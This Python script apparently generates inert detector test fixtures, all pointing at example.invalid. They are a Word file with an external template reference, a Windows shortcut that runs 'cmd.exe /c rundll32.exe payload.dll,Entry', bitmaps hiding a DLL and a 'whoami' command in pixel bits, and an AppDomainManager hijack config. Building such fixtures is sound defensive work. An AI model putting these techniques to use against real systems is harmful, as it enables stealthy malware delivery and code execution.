#!/usr/bin/env python3
"""Reproducible inert parser fixtures, containing only example.invalid URLs."""

import struct
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1] / "fixtures"
REL = "http://schemas.openxmlformats.org/package/2006/relationships"
OFFICE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
WORD = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"


def bitmap(payload):
    message = len(payload).to_bytes(4, "little") + payload
    width = 64
    height = (len(message) * 8 + width * 3 - 1) // (width * 3)
    pixels = bytearray([128] * (width * height * 3))
    for index in range(len(message) * 8):
        pixels[index] |= (message[index // 8] >> (index % 8)) & 1
    size = 54 + len(pixels)
    header = b"BM" + struct.pack("<IHHI", size, 0, 0, 54)
    info = struct.pack(
        "<IiiHHIIiiII", 40, width, height, 1, 24, 0, len(pixels), 0, 0, 0, 0
    )
    return header + info + pixels


def main():
    documents = {
        "[Content_Types].xml": '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>',
        "_rels/.rels": f'<Relationships xmlns="{REL}"><Relationship Id="rId1" Type="{OFFICE}/officeDocument" Target="word/document.xml"/></Relationships>',
        "word/document.xml": f'<w:document xmlns:w="{WORD}"><w:body><w:p><w:r><w:t>Detector parser fixture</w:t></w:r></w:p></w:body></w:document>',
        "word/_rels/document.xml.rels": f'<Relationships xmlns="{REL}"><Relationship Id="rIdSettings" Type="{OFFICE}/settings" Target="settings.xml"/></Relationships>',
        "word/settings.xml": f'<w:settings xmlns:w="{WORD}" xmlns:r="{OFFICE}"><w:attachedTemplate r:id="rIdTemplate"/></w:settings>',
        "word/_rels/settings.xml.rels": f'<Relationships xmlns="{REL}"><Relationship Id="rIdTemplate" Type="{OFFICE}/attachedTemplate" Target="https://example.invalid/template.dotm" TargetMode="External"/></Relationships>',
    }
    with zipfile.ZipFile(ROOT / "feasible_template.docx", "w") as archive:
        for name, text in sorted(documents.items()):
            item = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            archive.writestr(item, text.encode())
    header = bytearray(76)
    header[:4] = (76).to_bytes(4, "little")
    header[4:20] = bytes.fromhex("0114020000000000c000000000000046")
    header[20:24] = (0x40E8).to_bytes(4, "little")
    header[60:64] = (1).to_bytes(4, "little")
    target = r"C:\Windows\System32\cmd.exe"
    arguments = "/c rundll32.exe payload.dll,Entry"
    url = "https://example.invalid/payload.dll"
    data = bytes(header)
    for text in (target, arguments, url):
        data += struct.pack("<H", len(text)) + text.encode("utf-16le")
    environment = (
        struct.pack("<II", 0x314, 0xA0000007)
        + url.encode().ljust(260, b"\0")
        + url.encode("utf-16le").ljust(520, b"\0")
    )
    (ROOT / "feasible_icon.lnk").write_bytes(data + environment + bytes(4))
    (ROOT / "feasible_hidden.bmp").write_bytes(
        bitmap((ROOT / "feasible_payload.dll").read_bytes())
    )
    (ROOT / "feasible_command.bmp").write_bytes(bitmap(b"cmd.exe /c whoami"))
    (ROOT / "feasible_adfs.config").write_text(
        '<configuration><runtime><appDomainManagerAssembly value="LabManager"/><appDomainManagerType value="LabManager.Manager"/></runtime></configuration>\n'
    )


if __name__ == "__main__":
    main()
